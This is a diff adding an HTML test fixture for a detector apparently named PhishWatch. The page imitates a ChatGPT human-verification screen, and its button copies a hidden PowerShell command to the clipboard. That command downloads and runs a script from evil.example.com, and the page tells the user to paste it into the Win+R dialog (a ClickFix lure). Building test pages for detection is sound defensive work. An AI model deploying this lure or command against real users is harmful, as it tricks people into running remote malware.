@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>ChatGPT - Verify Access</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: #212121;
+    display: flex; align-items: center; justify-content: center;
+    height: 100vh; margin: 0; color: #ececec;
+  }
+  .card {
+    background: #2f2f2f;
+    border-radius: 16px;
+    padding: 40px 48px;
+    max-width: 460px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 24px 60px rgba(0,0,0,0.4);
+  }
+  .logo { font-size: 40px; margin-bottom: 16px; }
+  h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .sub { font-size: 14px; color: #8e8ea0; margin-bottom: 28px; }
+  .steps {
+    background: #1a1a1a;
+    border-radius: 10px;
+    padding: 20px 24px;
+    text-align: left;
+    margin-bottom: 24px;
+    font-size: 14px;
+    line-height: 2;
+    color: #d1d5db;
+  }
+  .steps ol { padding-left: 18px; }
+  kbd {
+    background: #3f3f3f; border: 1px solid #555;
+    border-radius: 4px; padding: 1px 6px;
+    font-size: 12px; font-family: monospace;
+  }
+  .btn {
+    background: #10a37f; color: white; border: none;
+    padding: 14px 32px; border-radius: 8px;
+    font-size: 15px; font-weight: 600;
+    cursor: pointer; width: 100%;
+    transition: background 0.15s;
+  }
+  .btn:hover { background: #0d8c6d; }
+  .footer-note { font-size: 11px; color: #666; margin-top: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🤖</div>
+  <h1>ChatGPT — Verify you are human</h1>
+  <p class="sub">OpenAI requires a one-time verification to continue.</p>
+
+  <div class="steps">
+    <ol>
+      <li>Click <strong>Verify</strong> below to copy the verification code</li>
+      <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</li>
+      <li>Paste the code (<kbd>Ctrl</kbd> + <kbd>V</kbd>) and press Enter</li>
+    </ol>
+  </div>
+
+  <button class="btn" id="verifyBtn">Verify ✓</button>
+  <p class="footer-note">This verification helps protect ChatGPT from automated abuse.</p>
+</div>
+
+<script>
+document.getElementById('verifyBtn').addEventListener('click', function() {
+  // Writes a malicious PowerShell command — same pattern as real AI Lure attacks.
+  // PhishWatch should fire on TWO paths:
+  //   1. detectAILurePage() on page load (ChatGPT brand + Win+R instruction → score ≥ 50)
+  //   2. initClipboardWriteMonitoring() on button click (writeText hook → ClickFix BLOCK)
+  navigator.clipboard.writeText(
+    'powershell -w hidden -c "iex(iwr https://evil.example.com/payload.ps1)"'
+  ).then(function() {
+    document.getElementById('verifyBtn').textContent = 'Code copied! ✓';
+  });
+});
+</script>
+</body>
+</html>
